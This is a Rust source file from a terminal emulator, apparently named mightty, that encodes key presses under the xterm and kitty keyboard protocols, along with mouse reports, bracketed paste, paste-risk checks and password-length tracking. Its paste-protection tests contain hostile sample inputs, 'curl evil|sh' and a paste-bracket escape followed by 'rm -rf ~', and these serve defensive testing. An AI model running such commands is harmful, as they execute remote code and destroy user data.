//! Key events → bytes for the PTY: xterm encoding, and the kitty keyboard
//! protocol for programs that ask for it
//! (<https://sw.kovidgoyal.net/kitty/keyboard-protocol/>).

use mightty_term::{
    KEY_ALL_AS_ESCAPES, KEY_ALTERNATES, KEY_DISAMBIGUATE, KEY_EVENT_TYPES, KEY_TEXT,
};

#[derive(Clone, Copy, Debug, Default)]
pub struct Mods {
    pub shift: bool,
    pub ctrl: bool,
    /// Option, treated as Meta.
    pub alt: bool,
    /// Command: kitty's Super. Legacy encodings can't carry it.
    pub cmd: bool,
    pub caps_lock: bool,
}

impl Mods {
    /// xterm modifier parameter: 1 + shift + 2·alt + 4·ctrl.
    fn param(self) -> u8 {
        1 + self.shift as u8 + 2 * self.alt as u8 + 4 * self.ctrl as u8
    }
}

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub enum KeyAction {
    #[default]
    Press,
    Repeat,
    Release,
}

/// A key event, for [`kitty`].
#[derive(Clone, Copy, Debug, Default)]
pub struct Key<'a> {
    /// macOS virtual key code.
    pub code: u16,
    /// What it typed.
    pub text: &'a str,
    /// What it types with Shift (if held) but no other modifier.
    pub shifted: &'a str,
    /// What it types with no modifiers at all.
    pub unshifted: &'a str,
    pub mods: Mods,
    pub action: KeyAction,
}

/// Encodes a key event under the kitty keyboard protocol `flags` (see
/// `mightty_term::KEY_*`). With no flags, or for keys the flags leave alone,
/// it's the xterm encoding, which has no releases.
pub fn kitty(key: &Key, flags: u8, app_cursor: bool) -> Option<Vec<u8>> {
    let all = flags & KEY_ALL_AS_ESCAPES != 0;
    let disambiguate = all || flags & KEY_DISAMBIGUATE != 0;
    let events = flags & KEY_EVENT_TYPES != 0;
    let m = key.mods;
    let chord = m.ctrl || m.alt || m.cmd;
    let legacy = || match key.action {
        KeyAction::Release => None,
        _ => encode(key.code, key.text, key.shifted, m, app_cursor),
    };
    let (number, end, kind) = match functional(key.code, all) {
        Some(f) => f,
        None => match key.unshifted.chars().next().filter(|c| !c.is_control()) {
            Some(c) => (
                c.to_lowercase().next().unwrap_or(c) as u32,
                b'u',
                Kind::Text,
            ),
            None => return legacy(),
        },
    };
    let escape = match kind {
        Kind::Text => all || (disambiguate && chord),
        // Kept as bytes so a shell stays usable after a program that turned
        // the protocol on crashes.
        Kind::Typing => all || (disambiguate && (chord || m.shift)),
        Kind::Escape => disambiguate,
        Kind::Modifier => all,
        // Same as xterm's unless something only kitty can say is added, or
        // xterm has nothing for it (Insert, F13 and up), or for F3, whose
        // `CSI 1;5R` reads as a cursor position report.
        Kind::Function => {
            all || m.cmd
                || (events && key.action != KeyAction::Press)
                || end == b'u'
                || number == 2
                || key.code == 99
        }
    };
    if !escape {
        return if kind == Kind::Modifier {
            None
        } else {
            legacy()
        };
    }
    if key.action == KeyAction::Release && !events {
        return None;
    }

    let mut out = format!("\x1b[{number}");
    if kind == Kind::Text && flags & KEY_ALTERNATES != 0 {
        let first = |s: &str| s.chars().next().map(|c| c as u32).filter(|&c| c != number);
        let shifted = first(key.shifted).filter(|_| m.shift);
        let base = us_layout(key.code).map(u32::from).filter(|&c| c != number);
        if shifted.is_some() || base.is_some() {
            out += &format!(":{}", shifted.map(|c| c.to_string()).unwrap_or_default());
        }
        if let Some(base) = base {
            out += &format!(":{base}");
        }
    }
    let locks = if all { 64 * m.caps_lock as u8 } else { 0 };
    let mods = 1 + m.shift as u8 + 2 * m.alt as u8 + 4 * m.ctrl as u8 + 8 * m.cmd as u8 + locks;
    let action = match key.action {
        KeyAction::Press => "",
        _ if !events => "",
        KeyAction::Repeat => ":2",
        KeyAction::Release => ":3",
    };
    let text: Vec<String> = if all && flags & KEY_TEXT != 0 && key.action != KeyAction::Release {
        key.text
            .chars()
            .take_while(|c| !c.is_control())
            .map(|c| (c as u32).to_string())
            .collect()
    } else {
        Vec::new()
    };
    if mods > 1 || !action.is_empty() || !text.is_empty() {
        out.push(';');
        if mods > 1 || !action.is_empty() {
            out += &format!("{mods}{action}");
        }
    }
    if !text.is_empty() {
        out += &format!(";{}", text.join(":"));
    }
    // `CSI 1 A` is just `CSI A`.
    if end != b'u' && end != b'~' && out == "\x1b[1" {
        out.truncate(2);
    }
    out.push(end as char);
    Some(out.into_bytes())
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Kind {
    /// A key that types a character.
    Text,
    /// Return, Tab, Backspace.
    Typing,
    Escape,
    /// Shift, Control, Option, Command, Caps Lock themselves.
    Modifier,
    /// Arrows, F-keys, Home, keypad keys, …
    Function,
}

/// kitty's number and final byte for keys that don't type a character.
/// Keypad keys are kitty's own keys only when every key is an escape code;
/// otherwise they type what they type.
fn functional(code: u16, all: bool) -> Option<(u32, u8, Kind)> {
    let (number, end) = match code {
        36 => return Some((13, b'u', Kind::Typing)),
        48 => return Some((9, b'u', Kind::Typing)),
        51 => return Some((127, b'u', Kind::Typing)),
        53 => return Some((27, b'u', Kind::Escape)),
        56 => return Some((57441, b'u', Kind::Modifier)),
        59 => return Some((57442, b'u', Kind::Modifier)),
        58 => return Some((57443, b'u', Kind::Modifier)),
        55 => return Some((57444, b'u', Kind::Modifier)),
        60 => return Some((57447, b'u', Kind::Modifier)),
        62 => return Some((57448, b'u', Kind::Modifier)),
        61 => return Some((57449, b'u', Kind::Modifier)),
        54 => return Some((57450, b'u', Kind::Modifier)),
        57 => return Some((57358, b'u', Kind::Modifier)),
        76 if all => (57414, b'u'),
        76 => return Some((13, b'u', Kind::Typing)),
        123 => (1, b'D'),
        124 => (1, b'C'),
        125 => (1, b'B'),
        126 => (1, b'A'),
        115 => (1, b'H'),
        119 => (1, b'F'),
        114 => (2, b'~'),
        117 => (3, b'~'),
        116 => (5, b'~'),
        121 => (6, b'~'),
        122 => (1, b'P'),
        120 => (1, b'Q'),
        99 => (13, b'~'),
        118 => (1, b'S'),
        96 => (15, b'~'),
        97 => (17, b'~'),
        98 => (18, b'~'),
        100 => (19, b'~'),
        101 => (20, b'~'),
        109 => (21, b'~'),
        103 => (23, b'~'),
        111 => (24, b'~'),
        105 => (57376, b'u'),
        107 => (57377, b'u'),
        113 => (57378, b'u'),
        106 => (57379, b'u'),
        64 => (57380, b'u'),
        79 => (57381, b'u'),
        80 => (57382, b'u'),
        90 => (57383, b'u'),
        82..=89 if all => (57399 + u32::from(code - 82), b'u'),
        91 if all => (57407, b'u'),
        92 if all => (57408, b'u'),
        65 if all => (57409, b'u'),
        75 if all => (57410, b'u'),
        67 if all => (57411, b'u'),
        78 if all => (57412, b'u'),
        69 if all => (57413, b'u'),
        81 if all => (57415, b'u'),
        _ => return None,
    };
    Some((number, end, Kind::Function))
}

/// What the key types on a US layout, for kitty's base-layout key.
fn us_layout(code: u16) -> Option<u8> {
    const KEYS: &[u8; 51] = b"asdfhgzxcv\0bqweryt123465=97-80]ou[ip\0lj'k;\\,/nm.\0\0`";
    let c = *KEYS.get(usize::from(code))?;
    (c != 0).then_some(c)
}

/// Encodes a key press. `chars` is what the key typed; `base` is the same key
/// ignoring every modifier except Shift.
pub fn encode(
    key_code: u16,
    chars: &str,
    base: &str,
    mods: Mods,
    app_cursor: bool,
) -> Option<Vec<u8>> {
    // macOS virtual key codes (Carbon `kVK_*`).
    let cursor_key = |letter: u8| {
        if mods.param() > 1 {
            format!("\x1b[1;{}{}", mods.param(), letter as char).into_bytes()
        } else if app_cursor {
            vec![0x1b, b'O', letter]
        } else {
            vec![0x1b, b'[', letter]
        }
    };
    let tilde_key = |n: u8| {
        if mods.param() > 1 {
            format!("\x1b[{n};{}~", mods.param()).into_bytes()
        } else {
            format!("\x1b[{n}~").into_bytes()
        }
    };
    let ss3_key = |letter: u8| {
        if mods.param() > 1 {
            format!("\x1b[1;{}{}", mods.param(), letter as char).into_bytes()
        } else {
            vec![0x1b, b'O', letter]
        }
    };
    let alt_prefix = |bytes: &[u8]| {
        let mut out = Vec::with_capacity(bytes.len() + 1);
        if mods.alt {
            out.push(0x1b);
        }
        out.extend_from_slice(bytes);
        out
    };

    let bytes = match key_code {
        36 | 76 => alt_prefix(b"\r"),
        48 if mods.shift => b"\x1b[Z".to_vec(),
        48 => b"\t".to_vec(),
        51 if mods.ctrl => alt_prefix(b"\x08"),
        51 => alt_prefix(b"\x7f"),
        53 => b"\x1b".to_vec(),
        123 => cursor_key(b'D'),
        124 => cursor_key(b'C'),
        125 => cursor_key(b'B'),
        126 => cursor_key(b'A'),
        115 => cursor_key(b'H'),
        119 => cursor_key(b'F'),
        116 => tilde_key(5),
        121 => tilde_key(6),
        117 => tilde_key(3),
        122 => ss3_key(b'P'),
        120 => ss3_key(b'Q'),
        99 => ss3_key(b'R'),
        118 => ss3_key(b'S'),
        96 => tilde_key(15),
        97 => tilde_key(17),
        98 => tilde_key(18),
        100 => tilde_key(19),
        101 => tilde_key(20),
        109 => tilde_key(21),
        103 => tilde_key(23),
        111 => tilde_key(24),
        _ if mods.ctrl => {
            let c = base.chars().next()?;
            let byte = match c.to_ascii_lowercase() {
                c @ 'a'..='z' => c as u8 - b'a' + 1,
                '@' | ' ' | '2' => 0,
                '[' | '3' => 0x1b,
                '\\' | '4' => 0x1c,
                ']' | '5' => 0x1d,
                '^' | '6' => 0x1e,
                '_' | '-' | '/' | '7' => 0x1f,
                '8' => 0x7f,
                _ => return Some(alt_prefix(chars.as_bytes())).filter(|b| !b.is_empty()),
            };
            alt_prefix(&[byte])
        }
        // Option as Meta: send the unmodified character with an ESC prefix.
        _ if mods.alt => alt_prefix(base.as_bytes()),
        _ => chars.as_bytes().to_vec(),
    };
    (!bytes.is_empty()).then_some(bytes)
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum MouseAction {
    Press,
    Release,
    Motion,
}

/// Encodes a mouse report. `button`: 0 left, 1 middle, 2 right, 64/65 wheel
/// up/down. SGR (mode 1006) when `sgr`, otherwise the legacy X10 encoding,
/// which can't express columns or rows past 223.
pub fn mouse_report(
    button: u8,
    action: MouseAction,
    col: usize,
    row: usize,
    mods: Mods,
    sgr: bool,
) -> Vec<u8> {
    let mut code = button
        + if mods.shift { 4 } else { 0 }
        + if mods.alt { 8 } else { 0 }
        + if mods.ctrl { 16 } else { 0 };
    if action == MouseAction::Motion {
        code += 32;
    }
    if sgr {
        let end = if action == MouseAction::Release {
            'm'
        } else {
            'M'
        };
        return format!("\x1b[<{code};{};{}{end}", col + 1, row + 1).into_bytes();
    }
    if action == MouseAction::Release && button < 64 {
        code = (code & !3) | 3; // X10 can't say which button was released
    }
    let coord = |v: usize| (v.min(222) + 33) as u8;
    vec![0x1b, b'[', b'M', code + 32, coord(col), coord(row)]
}

/// Prepares clipboard text for the PTY: newlines become CR, and in bracketed
/// paste mode ESC is stripped so the text can't end the paste early.
pub fn paste(text: &str, bracketed: bool) -> Vec<u8> {
    let text = text.replace("\r\n", "\r").replace('\n', "\r");
    if !bracketed {
        return text.into_bytes();
    }
    let mut out = b"\x1b[200~".to_vec();
    out.extend(text.bytes().filter(|&b| b != 0x1b));
    out.extend_from_slice(b"\x1b[201~");
    out
}

/// Whether pasting `text` should be confirmed first (`clipboard-paste-protection`):
/// a line break runs what's before it in a shell that isn't using bracketed
/// paste, and control characters act as keys (^C, ^D, ^Z, Esc) either way.
/// A program can set the clipboard (OSC 52) for the user to paste.
pub fn paste_is_risky(text: &str, bracketed: bool) -> bool {
    text.chars().any(|c| match c {
        '\n' | '\r' => !bracketed,
        '\t' => false,
        c => c.is_control(),
    })
}

/// `text` for showing in a sheet: control characters as visible symbols
/// (␛, ␊, ␇), so blank lines or escapes can't hide what's really there,
/// and cut to `max` characters.
pub fn visible_controls(text: &str, max: usize) -> String {
    let mut out: String = text
        .chars()
        .take(max)
        .map(|c| match c as u32 {
            n @ 0..0x20 => char::from_u32(0x2400 + n).unwrap_or('\u{FFFD}'),
            0x7f => '\u{2421}',
            _ if c.is_control() => '\u{FFFD}',
            _ => c,
        })
        .collect();
    if text.chars().nth(max).is_some() {
        out.push('…');
    }
    out
}

/// How many characters a password prompt holds after `count` and then
/// `bytes` typed, as the terminal's line editing counts them: backspace
/// takes one away, Ctrl-U and Ctrl-W clear the line, and Return, Ctrl-C
/// and Ctrl-D end it. Escape sequences (arrows, paste brackets) and other
/// control characters add nothing.
pub fn password_length(mut count: usize, bytes: &[u8]) -> usize {
    let mut bytes = bytes.iter().copied();
    while let Some(b) = bytes.next() {
        match b {
            b'\r' | b'\n' | 0x03 | 0x04 | 0x15 | 0x17 => count = 0,
            0x7f | 0x08 => count = count.saturating_sub(1),
            // CSI and SS3 up to the final byte; else ESC and the next byte.
            0x1b => {
                if let Some(b'[' | b'O') = bytes.next() {
                    bytes.by_ref().find(|b| (0x40..=0x7e).contains(b));
                }
            }
            // UTF-8 continuation bytes are part of a character counted already.
            0x00..=0x1f | 0x80..=0xbf => {}
            _ => count += 1,
        }
    }
    count
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn risky_pastes() {
        assert!(!paste_is_risky("ls -la", false));
        assert!(!paste_is_risky("a\tb", false));
        // Lines run one by one without bracketed paste; fine with it.
        assert!(paste_is_risky("ls\ncurl evil|sh\n", false));
        assert!(!paste_is_risky("ls\ncurl evil|sh\n", true));
        // Keys in disguise are risky either way.
        assert!(paste_is_risky("echo hi\u{3}", true));
        assert!(paste_is_risky("x\u{1b}[201~rm -rf ~\r", true));
        assert_eq!(
            visible_controls("\n\n\u{1b}[31mok\u{7f}\u{9b}", 100),
            "␊␊␛[31mok\u{2421}\u{FFFD}"
        );
        assert_eq!(visible_controls("abcdef", 3), "abc…");
    }

    fn key(code: u16, chars: &str, mods: Mods) -> Vec<u8> {
        encode(code, chars, chars, mods, false).unwrap()
    }

    #[test]
    fn text_and_specials() {
        assert_eq!(key(0, "a", Mods::default()), b"a");
        assert_eq!(key(36, "\r", Mods::default()), b"\r");
        assert_eq!(key(51, "\x7f", Mods::default()), b"\x7f");
        assert_eq!(
            key(
                48,
                "\t",
                Mods {
                    shift: true,
                    ..Default::default()
                }
            ),
            b"\x1b[Z"
        );
    }

    #[test]
    fn control_and_meta() {
        let ctrl = Mods {
            ctrl: true,
            ..Default::default()
        };
        assert_eq!(key(8, "c", ctrl), [3]);
        assert_eq!(key(33, "[", ctrl), [0x1b]);
        let alt = Mods {
            alt: true,
            ..Default::default()
        };
        assert_eq!(encode(11, "∫", "b", alt, false).unwrap(), b"\x1bb");
    }

    #[test]
    fn cursor_keys() {
        assert_eq!(key(126, "", Mods::default()), b"\x1b[A");
        assert_eq!(
            encode(126, "", "", Mods::default(), true).unwrap(),
            b"\x1bOA"
        );
        assert_eq!(
            key(
                123,
                "",
                Mods {
                    ctrl: true,
                    ..Default::default()
                }
            ),
            b"\x1b[1;5D"
        );
        assert_eq!(key(116, "", Mods::default()), b"\x1b[5~");
    }

    /// A key on a US layout: `text` typed, `unshifted` without modifiers.
    fn kitty_key(
        code: u16,
        text: &str,
        unshifted: &str,
        mods: Mods,
        action: KeyAction,
        flags: u8,
    ) -> Option<String> {
        let shifted = if mods.shift { text } else { unshifted };
        let key = Key {
            code,
            text,
            shifted,
            unshifted,
            mods,
            action,
        };
        kitty(&key, flags, false).map(|b| String::from_utf8(b).unwrap())
    }

    fn press(code: u16, text: &str, unshifted: &str, mods: Mods, flags: u8) -> String {
        kitty_key(code, text, unshifted, mods, KeyAction::Press, flags).unwrap()
    }

    #[test]
    fn kitty_disambiguate() {
        let none = Mods::default();
        let ctrl = Mods { ctrl: true, ..none };
        let shift = Mods {
            shift: true,
            ..none
        };
        let f = KEY_DISAMBIGUATE;
        // Text, and Return, Tab and Backspace alone, stay as they were.
        assert_eq!(press(0, "a", "a", none, f), "a");
        assert_eq!(press(0, "A", "a", shift, f), "A");
        assert_eq!(press(36, "\r", "\r", none, f), "\r");
        assert_eq!(press(51, "\x7f", "\x7f", none, f), "\x7f");
        // Chords and Esc become unambiguous.
        assert_eq!(press(0, "\x01", "a", ctrl, f), "\x1b[97;5u");
        assert_eq!(
            press(0, "a", "a", Mods { alt: true, ..none }, f),
            "\x1b[97;3u"
        );
        assert_eq!(
            press(
                0,
                "\x01",
                "a",
                Mods {
                    ctrl: true,
                    shift: true,
                    ..none
                },
                f
            ),
            "\x1b[97;6u"
        );
        assert_eq!(press(34, "\t", "i", ctrl, f), "\x1b[105;5u");
        assert_eq!(press(53, "\x1b", "\x1b", none, f), "\x1b[27u");
        assert_eq!(press(36, "\r", "\r", shift, f), "\x1b[13;2u");
        assert_eq!(press(48, "\t", "\t", shift, f), "\x1b[9;2u");
        assert_eq!(
            press(0, "a", "a", Mods { cmd: true, ..none }, f),
            "\x1b[97;9u"
        );
        // Function keys keep xterm's forms; kitty's only where xterm has none.
        assert_eq!(press(126, "", "", none, f), "\x1b[A");
        assert_eq!(press(126, "", "", ctrl, f), "\x1b[1;5A");
        assert_eq!(press(99, "", "", none, f), "\x1b[13~");
        assert_eq!(press(105, "", "", none, f), "\x1b[57376u");
        assert_eq!(press(114, "", "", none, f), "\x1b[2~");
        assert_eq!(kitty_key(0, "\x01", "a", ctrl, KeyAction::Release, f), None);
        // Modifier keys alone say nothing.
        assert_eq!(kitty_key(56, "", "", shift, KeyAction::Press, f), None);
    }

    #[test]
    fn kitty_event_types() {
        let none = Mods::default();
        let ctrl = Mods { ctrl: true, ..none };
        let f = KEY_DISAMBIGUATE | KEY_EVENT_TYPES;
        assert_eq!(
            kitty_key(0, "\x01", "a", ctrl, KeyAction::Release, f).unwrap(),
            "\x1b[97;5:3u"
        );
        assert_eq!(
            kitty_key(126, "", "", none, KeyAction::Repeat, f).unwrap(),
            "\x1b[1;1:2A"
        );
        assert_eq!(
            kitty_key(126, "", "", none, KeyAction::Release, f).unwrap(),
            "\x1b[1;1:3A"
        );
        // Text, Return and friends have no release unless every key is an escape code.
        assert_eq!(kitty_key(0, "a", "a", none, KeyAction::Release, f), None);
        assert_eq!(kitty_key(36, "\r", "\r", none, KeyAction::Release, f), None);
        assert_eq!(
            kitty_key(0, "a", "a", none, KeyAction::Repeat, f).unwrap(),
            "a"
        );
        let all = f | KEY_ALL_AS_ESCAPES;
        assert_eq!(
            kitty_key(36, "\r", "\r", none, KeyAction::Release, all).unwrap(),
            "\x1b[13;1:3u"
        );
    }

    #[test]
    fn kitty_all_keys() {
        let none = Mods::default();
        let shift = Mods {
            shift: true,
            ..none
        };
        let f = KEY_ALL_AS_ESCAPES;
        assert_eq!(press(0, "a", "a", none, f), "\x1b[97u");
        assert_eq!(press(36, "\r", "\r", none, f), "\x1b[13u");
        assert_eq!(press(126, "", "", none, f), "\x1b[A");
        assert_eq!(press(83, "1", "1", none, f), "\x1b[57400u");
        assert_eq!(press(76, "\x03", "\x03", none, f), "\x1b[57414u");
        assert_eq!(
            press(
                0,
                "A",
                "a",
                Mods {
                    caps_lock: true,
                    ..none
                },
                f
            ),
            "\x1b[97;65u"
        );
        // Modifier keys, with themselves held on press.
        assert_eq!(press(56, "", "", shift, f), "\x1b[57441;2u");
        assert_eq!(kitty_key(56, "", "", none, KeyAction::Release, f), None);
        assert_eq!(
            kitty_key(56, "", "", none, KeyAction::Release, f | KEY_EVENT_TYPES).unwrap(),
            "\x1b[57441;1:3u"
        );
        // With the text it typed.
        let text = f | KEY_TEXT;
        assert_eq!(press(0, "a", "a", none, text), "\x1b[97;;97u");
        assert_eq!(press(0, "A", "a", shift, text), "\x1b[97;2;65u");
        assert_eq!(
            kitty_key(
                0,
                "a",
                "a",
                none,
                KeyAction::Release,
                text | KEY_EVENT_TYPES
            )
            .unwrap(),
            "\x1b[97;1:3u"
        );
        // Shifted and US-layout keys.
        let alternates = f | KEY_ALTERNATES;
        assert_eq!(press(0, "A", "a", shift, alternates), "\x1b[97:65;2u");
        assert_eq!(press(0, "ф", "ф", none, alternates), "\x1b[1092::97u");
        assert_eq!(
            press(0, "Ф", "ф", shift, alternates),
            "\x1b[1092:1060:97;2u"
        );
    }

    #[test]
    fn kitty_without_flags_is_xterm() {
        let none = Mods::default();
        for (code, text, mods) in [
            (0, "a", none),
            (126, "", Mods { ctrl: true, ..none }),
            (53, "\x1b", none),
            (36, "\r", none),
        ] {
            assert_eq!(
                press(code, text, text, mods, 0).into_bytes(),
                encode(code, text, text, mods, false).unwrap()
            );
        }
        assert_eq!(kitty_key(0, "a", "a", none, KeyAction::Release, 0), None);
    }

    #[test]
    fn mouse_reports() {
        let none = Mods::default();
        assert_eq!(
            mouse_report(0, MouseAction::Press, 4, 9, none, true),
            b"\x1b[<0;5;10M"
        );
        assert_eq!(
            mouse_report(0, MouseAction::Release, 4, 9, none, true),
            b"\x1b[<0;5;10m"
        );
        assert_eq!(
            mouse_report(0, MouseAction::Motion, 0, 0, none, true),
            b"\x1b[<32;1;1M"
        );
        assert_eq!(
            mouse_report(
                65,
                MouseAction::Press,
                0,
                0,
                Mods { ctrl: true, ..none },
                true
            ),
            b"\x1b[<81;1;1M"
        );
        assert_eq!(
            mouse_report(0, MouseAction::Press, 0, 0, none, false),
            b"\x1b[M !!"
        );
        assert_eq!(
            mouse_report(2, MouseAction::Release, 0, 0, none, false),
            b"\x1b[M#!!"
        );
    }

    #[test]
    fn paste_modes() {
        assert_eq!(paste("a\nb", false), b"a\rb");
        assert_eq!(paste("x\x1b[201~y", true), b"\x1b[200~x[201~y\x1b[201~");
    }

    #[test]
    fn password_lengths() {
        assert_eq!(password_length(0, "pässwörd".as_bytes()), 8);
        assert_eq!(password_length(3, b"ab\x7f"), 4);
        assert_eq!(password_length(1, b"\x7f\x7f"), 0);
        assert_eq!(password_length(5, b"\x15x"), 1);
        assert_eq!(password_length(5, b"\r"), 0);
        // Arrows and paste brackets count for nothing; what's pasted does.
        assert_eq!(password_length(2, b"\x1b[D\x1bOA\x1b[200~xyz\x1b[201~"), 5);
        assert_eq!(password_length(0, b"\x1bb"), 0);
    }
}
